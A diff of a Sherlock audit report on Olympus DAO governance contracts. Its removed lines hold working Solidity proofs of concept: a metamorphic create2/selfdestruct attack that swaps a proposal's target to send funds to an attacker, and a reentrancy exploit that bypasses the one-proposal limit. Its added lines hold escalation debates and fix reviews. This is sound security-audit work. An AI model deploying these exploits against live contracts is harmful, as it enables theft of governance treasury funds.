@@ -1,197 +1,3 @@
-# Issue H-1: Proposals are vulnerable to metamorphic attacks 
-
-Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/103 
-
-## Found by 
-Bobface, IllIllI
-## Summary
-
-Proposals are vulnerable to metamorphic attacks where `create2()`/`selfdestruct()` are used to completely re-write proposal actions right before execution
-
-
-## Vulnerability Detail
-
-The timelock does not ensure that the `code` at the address of the target of the timelock's transaction hasn't changed since being proposed.
-
-
-## Impact
-
-An attacker can completely rewrite the backing logic of a proposal's external calls, as was seen in the [tornado governance attack](https://forum.tornado.ws/t/full-governance-attack-description/62), or by creating a `create2()`'d contract with a `payable fallback()` at the destination of an Eth transfer of part of a proposal
-
-
-## Code Snippet
-
-The target's code is not included in what's hashed:
-```solidity
-// File: src/external/governance/Timelock.sol : Timelock.queueTransaction()   #1
-
-118:           bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));
-```
-https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/Timelock.sol#L108-L118
-
-and target passed in to the execution function is not verified to have the same code as during the proposal:
-```solidity
-// File: src/external/governance/Timelock.sol : Timelock.executeTransaction()   #2
-
-164            // solium-disable-next-line security/no-call-value
-165:           (bool success, bytes memory returnData) = target.call{value: value}(callData);
-```
-https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/Timelock.sol#L164-L165
-
-
-## Tool used
-
-Manual Review
-
-
-## Recommendation
-
-Include the target address' [code](https://github.com/coinspect/learn-evm-attacks/tree/master/test/Business_Logic/TornadoCash_Governance#possible-mitigations) in what's hashed
-
-
-
-## Discussion
-
-**sherlock-admin2**
-
-1 comment(s) were left on this issue during the judging contest.
-
-**haxatron** commented:
-> Invalid. Interesting, but this is not limited to metamorphic contracts but proxy contracts too and is therefore an inherent risk in all DAOs. In addition the Tornado hack involved delegatecall whereas Bravo implementation just makes an external call.
-
-
-
-**0xLienid**
-
-near impossible to fix the proxy contract case, but we will add a codehash check anyways to at least reduce the surface area
-
-**nevillehuang**
-
-Request poc
-
-**sherlock-admin**
-
-PoC requested from @IllIllI000
-
-Requests remaining: **6**
-
-**IllIllI000**
-
-Please read through steps 1-5:
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity 0.8.15;
-
-// code modified from https://github.com/pcaversaccio/tornado-cash-exploit/blob/main/test/MetamorphicContract.t.sol
-
-import {Test} from "forge-std/Test.sol";
-import {console} from "forge-std/console.sol";
-
-contract DistributeFundsEqually {
-
-    function distributeFunds(address alice, uint256 aAmount, address bob, uint256 bAmount, address carol, uint256 cAmount) public payable {
-        console.log("Sending funds to alice, bob, carol");
-    }
-    
-    function cleanUp() public {
-        selfdestruct(payable(address(0)));
-    }
-}
-
-contract GiveAllFundsToAttacker {
-    address private attacker;
-
-    constructor(address a_) {
-        attacker = a_;
-    }
-    
-    function distributeFunds(address alice, uint256 aAmount, address bob, uint256 bAmount, address carol, uint256 cAmount) public payable {
-        console.log("Sending _all_ funds to the attacker instead ", attacker);
-    }
-}
-
-contract Factory {
-    function helloA() public returns (address) {
-        return address(new DistributeFundsEqually());
-    }
-
-    function helloB() public returns (address) {
-        return address(new GiveAllFundsToAttacker(address(0x1337)));
-    }
-
-    function cleanUp() public {
-        selfdestruct(payable(address(0)));
-    }
-}
-
-contract MetamorphicContract is Test {
-    DistributeFundsEqually private a;
-    Factory private factory;
-
-    function setUp() public {
-        /** Step 1: deploy original contract that everyone will look at for the proposal. Nobody has to know about the factory, and it won't have verified source on etherscan **/
-        factory = new Factory{salt: keccak256(abi.encode("random"))}();
-        a = DistributeFundsEqually(factory.helloA());
-
-        /** Step 2: create a proposal that will call a.distributeFunds(), with funds transferred from the OHM Kernel TRSRY module, to each of the listed recipients with the specified values **/
-        // will use vm.deal() and a direct call, rather than doing the proposal setup stuff in this test
-        
-        /** Step 3: wait for the proposal to pass **/
-
-        /** Step 4a: selfdestruct things to a new attacker contract can be created at the same address as the original DistributeFundsEqually contract **/
-        /// @dev Call `selfdestruct` during the `setUp` call (see https://github.com/foundry-rs/foundry/issues/1543).
-        a.cleanUp();
-        factory.cleanUp();
-    }
-
-    function testMorphingContract() public {
-        /// @dev Verify that the code was destroyed during the `setUp` call.
-        assertEq(address(a).code.length, 0);
-        assertEq(address(factory).code.length, 0);
-
-        /** Step 4b: create the new GiveAllFundsToAttacker contract at the same address as the original DistributeFundsEqually contract **/
-        /// @dev Redeploy the factory contract at the same address.
-        factory = new Factory{salt: keccak256(abi.encode("random"))}();
-        /// @dev Deploy another logic contract at the same address as previously contract `a`.
-        GiveAllFundsToAttacker b = GiveAllFundsToAttacker(factory.helloB());
-        assertEq(address(a), address(b));
-        
-        /** Step 5: execute() the proposal, seeing that all funds get sent to the attacker **/
-        vm.deal(address(this), 99 ether);
-        a.distributeFunds{value: 99}(address(0x0a), 33 ether, address(0x0b), 33 ether, address(0x0c), 33 ether);
-    }
-}
-```
-output:
-```text
-Running 1 test for src/test/Test.t.sol:MetamorphicContract
-[PASS] testMorphingContract() (gas: 528012)
-Logs:
-  Sending _all_ funds to the attacker instead  0x0000000000000000000000000000000000001337
-
-Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.14ms
-```
-
-**nevillehuang**
-
-@IllIllI000 Thanks, wow, just interested what is the fix to this issue? Wouldn't this be applicable to all governance protocols? Would be good to see some example on how certain governance protocols prevents this.
-
-**IllIllI000**
-
-The duplicate #56 points to MakerDAO as having [this](https://github.com/dapphub/ds-pause/blob/0763eafcf926fd2e073aee5f047f3decb842231c/src/pause.sol#L97) protection of checking the `extcodehash`
-
-**nevillehuang**
-
-@IllIllI000 Thanks, I believe this could possibly be even high severity if the target address is in the power of the proposer, or don't even have to be so, given the ability to front-run on mainnet.
-
-**0xLienid**
-
-Fix: https://github.com/OlympusDAO/bophades/pull/300
-
-**nevillehuang**
-
-Based on discussions here and comments by sponsor [here](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/89#issuecomment-1913682953), I believe this issue consitutes high severity. What do you think @Czar102? 
-
 # Issue M-1: Nobody can cast for any proposal 
 
 Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/37 
@@ -334,229 +140,97 @@ Can agree, since this is purely a DoS, no malicious actions can be performed sin
 
 Fix: https://github.com/OlympusDAO/bophades/pull/293
 
-# Issue M-2: Proposer can create high number of proposals through reentrancy 
+**IllIllI000**
 
-Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/62 
+The [PR](https://github.com/OlympusDAO/bophades/pull/293) follows the suggested recommendation and correctly modifies the only place that solely `block.number` is used, changing it to `block.number - 1`. The only place not using this value is the [call](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/6171681cfeec8a24b0449f988b75908b5e640a35/bophades/src/external/governance/GovernorBravoDelegate.sol#L445C59-L445C78) above it which uses `proposal.startBlock`. The `state()` when `startBlock` is equal to `block.number` is `ProposalState.Pending`, so this case will never cause problems, since there are checks of the [state](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/6171681cfeec8a24b0449f988b75908b5e640a35/bophades/src/external/governance/GovernorBravoDelegate.sol#L438). The PR also modifies the mock gOHM contract to mirror the behavior that caused the bug.
 
-## Found by 
-r0ck3tz, s1ce
-## Summary
+**s1ce**
 
-The reentrancy through the [`_isHighRiskProposal`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L611-L670) function of the GovernorBravoDelegate contract allows the creation of a high number of proposals by the same proposer.
+Escalate
 
-## Vulnerability Detail
+This is a high. Voting is a core part of a governance protocol, and this bricks all voting functionality. 
 
-The [`propose`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L127-L205) function of `GovernorBravoDelegate` contract [ensures that the proposer can create only one proposal](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L147-L154) that is either pending or active.
+**sherlock-admin2**
 
-```solidity
-uint256 latestProposalId = latestProposalIds[msg.sender];
-if (latestProposalId != 0) {
-    ProposalState proposersLatestProposalState = state(latestProposalId);
-    if (proposersLatestProposalState == ProposalState.Active)
-         revert GovernorBravo_Proposal_AlreadyActive();
-    if (proposersLatestProposalState == ProposalState.Pending)
-         revert GovernorBravo_Proposal_AlreadyPending();
-}
-``` 
+> Escalate
+> 
+> This is a high. Voting is a core part of a governance protocol, and this bricks all voting functionality. 
 
-Once the proposal is created, the value in the [`latestProposalIds`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L190) mapping is updated. The issue is that before this update, the [`_isHighRiskProposal`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L169) function is executed, allowing reentrancy through a call to [`configureDependencies`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L655-L656) of the provided target address. This can be exploited by an attacker who creates a proposal that reenters the `propose` function before the `latestProposalIds` mapping is updated, thereby creating additional proposals
+You've created a valid escalation!
 
-The following proof of concept demonstrates the creation of 12 proposals by a single proposer:
+To remove the escalation from consideration: Delete your comment.
 
-`ReentrancyExploit` contract:
-```solidity
-contract ReentrancyExploit {
-    using Address for address;
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
 
-    GovernorBravoDelegator governorBravoDelegator;
-    Kernel kernel;
-    
-    uint256 depth = 0;
+**0xf1b0**
 
-    function attack(GovernorBravoDelegator _governorBravoDelegator, Kernel _kernel) external {
-        governorBravoDelegator = _governorBravoDelegator;
-        kernel = _kernel;
-        
-        // Proposal 1
-        address[] memory targets = new address[](1);
-        uint256[] memory values = new uint256[](1);
-        string[] memory signatures = new string[](1);
-        bytes[] memory calldatas = new bytes[](1);
-        string memory description = "Proposal 1";
-        
-        targets[0] = address(kernel);
-        values[0] = 0;
-        signatures[0] = "";
-        calldatas[0] = abi.encodeWithSelector(
-            kernel.executeAction.selector,
-            Actions.ActivatePolicy,
-            address(this)
-        );
-    
-        bytes memory data = address(governorBravoDelegator).functionCall(
-            abi.encodeWithSignature(
-                "propose(address[],uint256[],string[],bytes[],string)",
-                targets,
-                values,
-                signatures,
-                calldatas,
-                description
-            )
-        );
-
-        uint256 proposalId = abi.decode(data, (uint256));
-        console2.log("created proposal", proposalId);
-    }
-
-    function configureDependencies() external returns (Keycode[] memory dependencies) {
-        console2.log("reentrancy");
-
-        address[] memory targets = new address[](1);
-        uint256[] memory values = new uint256[](1);
-        string[] memory signatures = new string[](1);
-        bytes[] memory calldatas = new bytes[](1);
-        string memory description = "Proposal 2";
-        
-        targets[0] = address(kernel);
-        values[0] = 0;
-        signatures[0] = "";
-        calldatas[0] = "";
-        if(depth++ < 10) {
-            calldatas[0] = abi.encodeWithSelector(
-                kernel.executeAction.selector,
-                Actions.ActivatePolicy,
-                address(this)
-            );
-        }
-
-        bytes memory data = address(governorBravoDelegator).functionCall(
-            abi.encodeWithSignature(
-                "propose(address[],uint256[],string[],bytes[],string)",
-                targets,
-                values,
-                signatures,
-                calldatas,
-                description
-            )
-        );
-        uint256 proposalId = abi.decode(data, (uint256));
-        console2.log("created proposal", proposalId);
-    }
-}
-```
-
-Foundry test case:
-```solidity
-function testExploit2() public {
-    ReentrancyExploit exploit = new ReentrancyExploit();
-    
-    vm.prank(alice);
-    gohm.transfer(address(exploit), 110_000e18);
-    gohm.checkpointVotes(address(exploit));
-
-    exploit.attack(governorBravoDelegator, kernel);
-}
-```
-
-Results:
-```shell
-[PASS] testExploit2() (gas: 5162466)
-Logs:
-  reentrancy
-  reentrancy
-  reentrancy
-  reentrancy
-  reentrancy
-  reentrancy
-  reentrancy
-  reentrancy
-  reentrancy
-  reentrancy
-  reentrancy
-  created proposal 12
-  created proposal 11
-  created proposal 10
-  created proposal 9
-  created proposal 8
-  created proposal 7
-  created proposal 6
-  created proposal 5
-  created proposal 4
-  created proposal 3
-  created proposal 2
-  created proposal 1
-
-Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.72ms
-
-Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
-```
-
-## Impact
-
-As a proposer, the attacker can bypass the limit of one active/pending proposal and create multiple proposals.
-
-## Code Snippet
-
-- https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L655-L656
-- https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L190
-
-## Tool used
-
-Manual Review
-
-## Recommendation
-
-It is recommended to follow the checks-effects-interactions pattern and update the `latestProposalIds` mapping before executing the `_isHighRiskProposal` function.
-
-
-
-## Discussion
+Besides the fact that this issue breaks the core logic of the contract, _it won't be immediately detected upon deployment_, as previously mentioned as the reason for downgrading the severity. The voting process only becomes possible after a proposal has been made and time has elapsed. At this point, the issue will be raised, necessitating the deployment of an update. While the new version is being prepared, the proposal may expire, and a new one will have to be created. If the proposal includes some critical changes, this time delay can pose a serious problem.
 
 **IllIllI000**
 
-I believe this is a low, because creating extra proposals does not cause any loss of funds/impact the functioning of the contract
+Ignore this part since, while true, it appears to be confusing some:
+~~The sponsor [mentioned](https://discord.com/channels/812037309376495636/1199005597035663520/1199639446585364480) this test file as where to look for how things will be deployed. The first action is to propose and start a vote for assigning the [whitelist guardian](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/6171681cfeec8a24b0449f988b75908b5e640a35/bophades/src/test/external/GovernorBravoDelegate.t.sol#L96-L100), and that will flag the issue before anything else.~~
 
-**0xLienid**
+Furthermore, the timelock needs to [pull](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/6171681cfeec8a24b0449f988b75908b5e640a35/bophades/src/policies/RolesAdmin.sol#L86) in order to become and admin with access to the treasury. Until that happens, the existing admin has the power to do anything, so there's no case where something critical can't be done. The 'pull' requirement for transferring the admin to the timelock is a requirement of the code, not of the test. The Sherlock rules also state that opportunity costs (e.g. delays in voting `for example, due to a loss of core functionality`) do not count as a loss of funds.
 
-We will still fix this though as it does throw a wrench in intended use
+**r0ck3tzx**
+
+The test file within `setUp()` function configures the environment for testing, not for the actual deployment. The deployment process can and probably will look different, so no assumptions should be made based on the test file. The mention just shows how the `whitelistGuardian` will be configured, and not at what time/stage it will be done.
+
+The LSW creates hypotheticals about how the deployment process might look, and because of that, the issue would be caught early. Anyone who has ever deployed a protocol knows that the process is complex and often involves use of private mempools. Making assumptions about the deployment without having actual deployment scripts is dangerous and might lead to serious issues. 
+
+**0xf1b0**
+
+Even though some proposals may be initiated at the time of deployment, it will take between 3 to 7 days before the issue becomes apparent, as voting will not be available until then.
 
 **nevillehuang**
 
-@IllIllI000 I think this should remain medium severity:
+I agree with watsons here, but would have to respect the decision of @Czar102 and his enforcement of sherlock rules. Governance protocols already have nuances of funds loss being not obvious, and the whole protocol revolves around voting as the core mechanism, if you cannot vote, you essentially lose the purpose of the whole governance.
 
-- The invariant of one active proposal per proposer is bypassed
-- This can be abused by any proposer to bypass proposal thresholds just by having sufficient balance in once instance and then cascade by transferring gOHM as well as be combined with other attack paths like in #103 and #100
-- Given there is a veto mechanism in place, if this is invalid, why should’t #104 and #100 be invalid too?
+**0xf1b0**
+
+I've seen a lot of discussion regarding the rule of funds at risk. It seems that they never take into account the lost profits. A scenario where the core functionality of the system is broken could result in a loss of confidence in the protocol, causing users to be hesitant about investing their money due to the fear of such an issue recurring.
+
+**Czar102**
+
+From my understanding, due to the fact that the timelock needs to pull, the new governance contract needs to call it. And since it's completely broken, it will never pull the admin rights.
+
+Hence, this is not a high severity impact of locking funds and rights in a governance, but a medium severity issue since the contract fails to work. Is it accurate? @IllIllI000 
 
 **IllIllI000**
 
-In the case of #104, I've shown that a completely valid proposal can be maliciously changed to be an attacker-controlled one. In the case of this bug, there is no change (that any of the submitters has pointed to) of the proposal being executed, so it would be apparent that the proposal is to queue other proposals, and would never pass. You're giving the submitters benefit of the doubt that they would have been able to chain multiple low attacks to create a medium, but none of them has actually done this, so I believe the rule is the findings have to stand on their own. The invariant argument seems like the only relevant one to me, but since there's no loss of funds and the contract isn't broken, it's hard to say that it would rise to be a medium: `Breaks core contract functionality, rendering the contract useless (should not be easily replaced without loss of funds) or leading to unknown potential exploits/loss of funds. Ex: Unable to remove malicious user/collateral from the contract` https://docs.sherlock.xyz/audits/judging/judging#v.-how-to-identify-a-medium-issue
+Yes, that's correct
 
-**nevillehuang**
+**Czar102**
 
-@IllIllI000 Isn't #100 also talking about only an invariant too? I mean sure you can say it bypasses the high risk check but isn't it still subjected to being vetoed? Or are you implying there that there is a possibility all of this can be bypassed without being noticed?
+Planning to reject the escalation and leave the issue as is.
 
-@Czar102 what do you think? I think I can agree with @IllIllI000.
+**0xf1b0**
+
+By the way, it will not be possible to update the contract, because a new implementation can only be set through the voting process, which does not work.
+
+That's at least 2 out of 3:
+- it won't be immediately detected upon deployment
+- it's not upgradeable
 
 **IllIllI000**
 
-For #100, the high-risk invariant is meant to protect against proposals taking funds with fewer votes than expected. It's essentially a weak _isAdmin_ check on distributing treasury funds, which is being bypassed. For this current issue, the only thing being bypassed is a check against a counter, and some other vulnerability would have to exist in order to lose funds.
+it's being deployed fresh for this project, so it'll just be redeployed. The 2/3 stuff I [think](https://github.com/sherlock-protocol/sherlock-v2-docs/pull/19/files#diff-2ca8cda6feebe0aa72fbd8892f0f1435d2f8443da97cf8f60737b37965dd53acL35) you're referring to is for new contests
 
-**nevillehuang**
+**Czar102**
 
-@IllIllI000 I understand the importance of the high risk check, given it was explicitly mentioned in the contest details, but I can also see how both this and the other issue is alluding to bypassing checks, and both can be mitigated by a vetoing mechanism.
+Result:
+Medium
+Has duplicates
 
-I definitely am sure that #100 is a valid medium severity, but this one I will listen to @Czar102 comments first before making a final decision.
+**sherlock-admin**
 
-**0xLienid**
+Escalations have been resolved successfully!
 
-Fix: https://github.com/OlympusDAO/bophades/pull/296
+Escalation status:
+- [s1ce](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/37/#issuecomment-1917427085): rejected
 
-**nevillehuang**
-
-@IllIllI000 I will maintain as medium severity. While this is not an invariant explicitly mentioned in the docs, I believe it breaks the invariant of one active proposal per proposer **easily** with minimal external conditions (and is quite obviously implied by the check), forcing the usage of the veto mechanism. This would constitute "breaking" intended functionality for me + sponsor agrees with me, so I will leave it up to you and other watsons to escalate or not during escalation period.
-
-# Issue M-3: High risk checks can be bypassed with extra `calldata` padding 
+# Issue M-2: High risk checks can be bypassed with extra `calldata` padding 
 
 Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/100 
 
@@ -687,7 +361,11 @@ Valid, will fix by reverting if the calldata doesn't match the right size since 
 
 Fix: https://github.com/OlympusDAO/bophades/pull/299
 
-# Issue M-4: Post-proposal vote quorum/threshold checks use a stale total supply value 
+**IllIllI000**
+
+The [PR](https://github.com/OlympusDAO/bophades/pull/299) introduces a new revert error, and reverts if the length is longer than expected, rather than allowing the code to continue if the calldata is longer than expected. Since the selector ensures that the right number of arguments is passed, there is no error in restricting possible future uses of extra calldata. The PR also adds a test.
+
+# Issue M-3: Post-proposal vote quorum/threshold checks use a stale total supply value 
 
 Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/102 
 
@@ -837,7 +515,37 @@ Yep, triggering of the start of voting.
 
 @IllIllI000 ready for review
 
-# Issue M-5: High-risk actions aren't all covered by the existing checks 
+**RealLTDingZhen**
+
+I thought about this issue while the contest was going on and didn't submit it, because I thought it's a design choice——Due to the highly variable totalsupply of gOHM, the proposer may need far more tokens than its initial amount to ensure that the proposal is not canceled, and opponents can use fewer votes to reject the proposal by mint more gOHM.
+By the way, the solution given by LSR is flawed——Attackers can manipulate totalsupply to cancel the proposer's proposal through flashloan.
+
+**IllIllI000**
+
+The [PR](https://github.com/OlympusDAO/bophades/pull/303) implements part of the [discussed](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/102#issuecomment-1915038664) changes. There is a new gOHM total supply threshold, under which only emergency votes are allowed. The level is correctly many orders of magnitude above the levels at which quorums have loss of precision. Calls to `propose()` are prevented when the total supply falls below the cutoff. A new `emergencyPropose()` is added, which can only be called during emergencies, by the veto guardian. It does not have any threshold requirements, or any limit to the number of outstanding proposals (both good), and does not update `latestProposalIds` (ok). Besides those differences, the code looks like `propose()`. For `propose()` the end block and quorum are no longer initially set, and require the user to call `activate()` to set them instead. The `activate()` function requires a non-emergency, pending state, for the start block to have been passed, and to not have been activated before. The proposal can be reentrantly re-activated in the same way #62, but there aren't any negative effects outside of extra events. There is no cut-off of when a proposal can be activated, which may allow proposals to stay dormant for years, until they're finally activated. `activate()` cannot be called during emergencies, so proposals created before an emergency will expire if things don't get resolved. This also means `emergencyPropose()` does not require activation or any actual votes - just that delays have been respected (seems to be intended behavior). The `execute()` function does not require any specific state during emergencies for the veto admin, but `timelock.executeTransaction()` prevents calling it multiple times. The `state()` function has a new state for `Emergency`, which applies to any proposal created by the veto admin via `emergencyPropose()`.
+	Bug Med: the proposal.proposalThreshold isn't updated during activate(), which can be many years after the initial proposal.
+	Bug Low: extra events if reentrantly called
+	Bug Low: emergency proposals (more than one is allowed) created during one emergency, can be executed during a later emergency
+
+**0xLienid**
+
+Refix: https://github.com/OlympusDAO/bophades/pull/334
+
+We added a activation grace period (which is checked in the `state` call) so that proposals cannot sit unactivated for months or years. We believe this sufficiently reduces the `proposalThreshold` concern. We chose not to update the `proposalThreshold` at the time of activation with this added check because it feels backwards from a governance perspective to brick someone's proposal after proposing if their balance has not changed.
+
+We also shifted certain components of the `proposal` struct modification above the `_isHighRiskProposalCheck` to prevent reentrancy.
+
+**IllIllI000**
+
+The [PR](https://github.com/OlympusDAO/bophades/pull/334) correctly addresses the Medium and one of the Lows from item 7 of 9 of the prior review, while leaving the remaining Low about emergency proposals being able to be used across emergencies. 
+	The extra events issue is fixed by moving up the state variable assignments to above the high risk proposal checks. 
+	The Medium is addressed by introducing a new state variable to GovernorBravoDelegateStorageV1, rather than to GovernorBravoDelegateStorageV2, for a grace period. There is no setter for the variable, so it must be set during the call to `initialize()` as the penultimate argument, which is properly done, or by creating a new implementation with a setter function. The `initialize()` call bounds the value within reasonable limits. 
+	The min amount is set to 17280, which is 2.4 days, and the max is set to 50400, which is exactly 7 days.
+	The `state()` function is properly changed to convert `Pending` to `Expired`, after the activation grace period. The code reverts with `GovernorBravo_Vote_Closed()` when activation is attempted after the grace period.
+	The PR adds tests for the grace period and for the reentrancy issue
+	With the death spiral issue and the activation grace period issue resolved, the issue of the total supply changing has been mitigated to low.
+
+# Issue M-4: High-risk actions aren't all covered by the existing checks 
 
 Source: https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/104 
 
@@ -915,4 +623,77 @@ Add those operations to the high risk category
 **0xLienid**
 
 Fix: https://github.com/OlympusDAO/bophades/pull/298
+
+**IllIllI000**
+
+The [PR](https://github.com/OlympusDAO/bophades/pull/298) properly adds the operations in the recommendation to the list of what's considered high risk, as well as the recommendations from all of the duplicates. This is done by returning `true` for anything with a target of the timelock or delegator, or for any kernel migration or executor change. The PR also adds tests.
+
+**s1ce**
+
+Escalate
+
+This is an informational issue. There are comments in the code which specifically describe the modules that the sponsors consider to be high risk , so would consider this to be a design decision. 
+
+For example, the following comments: 
+
+`// If the action is upgrading a module (1)`
+
+`// If the action is installing (2) or deactivating (3) a policy, pull the list of dependencies`
+
+**sherlock-admin2**
+
+> Escalate
+> 
+> This is an informational issue. There are comments in the code which specifically describe the modules that the sponsors consider to be high risk , so would consider this to be a design decision. 
+> 
+> For example, the following comments: 
+> 
+> `// If the action is upgrading a module (1)`
+> 
+> `// If the action is installing (2) or deactivating (3) a policy, pull the list of dependencies`
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**nevillehuang**
+
+@IllIllI000 any comments? I think this is not informational, because sensitive actions like this should consistently have appropriate quorums in place and not break the [high risk invariant](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/audit/2024-01_governance/README.md#proposal-quorum-threshold) allowing for execution with lower votes than normal. This cannot be seen as a documentation and design decision error given an explicit fix has been made.
+
+However, considering the veto mechanism, I can see where @s1ce is coming from.
+
+**IllIllI000**
+
+I think the Sherlock team will need to decide what they want to do for this sort of case, since bricking the protocol is an unambiguously dangerous ability, and the purpose of the feature is to prevent that sort of thing (or else why not just rely on vetos for everything). The readme also says `The proposal can be vetoed at any time (before execution) by the veto guardian. Initially, this role will belong to the DAO multisig. However, once the system matures, it could be set to the zero address.`, so at some point in the future, there will be nobody to veto anything.
+
+**0xLienid**
+
+Personally think this is a medium. These are definitionally high risk changes.
+
+**nevillehuang**
+
+> I think the Sherlock team will need to decide what they want to do for this sort of case, since bricking the protocol is an unambiguously dangerous ability, and the purpose of the feature is to prevent that sort of thing (or else why not just rely on vetos for everything). The readme also says `The proposal can be vetoed at any time (before execution) by the veto guardian. Initially, this role will belong to the DAO multisig. However, once the system matures, it could be set to the zero address.`, so at some point in the future, there will be nobody to veto anything.
+
+Extremely good point, I think this should remain as medium severity.
+
+**Czar102**
+
+Agree with @nevillehuang, @0xLienid and @IllIllI000. It seems managing policies is strictly safer than migrating the whole kernel.
+
+Planning to reject the escalation and leave the issue as is.
+
+**Czar102**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [s1ce](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance-judging/issues/104/#issuecomment-1917422380): rejected
 
